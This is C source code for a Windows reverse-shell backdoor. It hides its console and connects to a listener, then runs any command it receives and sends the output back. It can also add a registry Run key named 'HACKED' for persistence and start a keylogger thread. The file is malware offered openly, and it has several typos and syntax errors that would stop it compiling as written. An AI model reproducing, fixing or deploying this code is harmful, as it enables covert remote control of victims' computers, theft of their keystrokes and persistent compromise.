#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

#define bzero(p, size) (void) memset((p),0,(size))
int sock;
int bootRun(){
	char err[128] = "Failed\n";
	char suc[128] = "Creatd Persistence AT : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if(pathLen == 0){
		send(sock, err, sizeof(err), 0);
		return -1;
	}

	HKEY NewVal;
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurentVersion\\Run"), &NewVal) != ERROR_SUCCESS){
		send(sock, err, sizeof(err), 0);
		return -1;
	}

	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if(RegSetValueEx(NewVal, TEXT("HACKED"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
	}
	RegCloseKey(NewVal);
	send(sock, suc, sizeof(SUC), 0);
	return 0;
}

// concantenation function
char * str_cat(char str[], int slice_from, int slice_to){
	if(str[0] == '\0') //  Check for empty string
		return NULL;

	size_t str_len = strlen(str);
	
	// Handle negative indices
	if(slice_from < 0){
		slice_from = str_len + slice_from;
	}
	if (slice_to < 0){
		slice_to = str_len _ slice_to;
	}

	// validate indicies
	if(slice_from < 0 || slice_to < 0 || slice_from >= str_len || slice_to > str_len || slice_from >= slice_to){
		return NULL;
	}

	// Calculate length and allocate buffer
	size_t buffer_len = slice_to - slice_from + 1; // +1 for null terminator
	char *buffer = calloc(buffer_len, sizeof(char));
	
	if (buffer == NULL){
		return NULL // allocation failed
	}	
	// copy the slice and null terminate
	strncpy(buffer, str + slice_from, buffer_len - 1);
	buffer[buffer_len -1] = '\0';
	return buffer;
	
}

//Shell function
void Shell(){
	char buffer[1024];
	char container[1024];
	char total_response[18384];
	
	while(1){
		jump:
		bzero(buffer,sizeof(buffer));
		bzero(container,sizeof(container));
		bzero(total_response,sizeof(total_response));
	
		// Receive command
		if(recv(sock, buffer, sizeof(buffer), 0) <= 0){
			perror("recv failed");
			break;
		}

		
		// Quit conndition
		if(strncmp("q", buffer, 1) == 0){
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		// changing directory
		else if(strncmp("cd ", buffer, 3) == 0){
			chdir(str_cat(buffer, 3, 100));
		}
		// creating persistence
		else if(strncmp("persist", buffer, 7) == 0){
			bootRun();
		}
		// adding keylogger
		else if(strncmp("keylog_start", buffer, 12) == 0){
			HANDLE thread = createThread(NULL, 0, logg, NULL, 0, NULL);
			goto jump;
		}
		else {
			// Execute command
			FILE *fp;
			fp = _popen(buffer, "r");
			if (fp == NULL){
				perror("popen failed");
				continue;
			}
			while (fgets(container, sizeof(container), fp) != NULL){
				strncat(total_response, container, sizeof(total_response) - strlen(total_response) - 1);
			}
			// send response
			if(send(sock, total_response, strlen(total_response), 0) < 0){
				perror("send failed");
				break;
			}
			pclose(fp);
		}		
	}
}

// function to connect to server
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){

	//make program invisble during execution
	HWND stealth;
	FreeConsole();
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_HIDE);
	
	// initiate connection
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;
	
	ServIP = "127.0.0.1";//address of machine that listens for information
	ServPort = 50005;


	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0){
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);
	
	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);
	
	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0){
		Sleep(10);
		goto start;
		
	}
	Shell();
}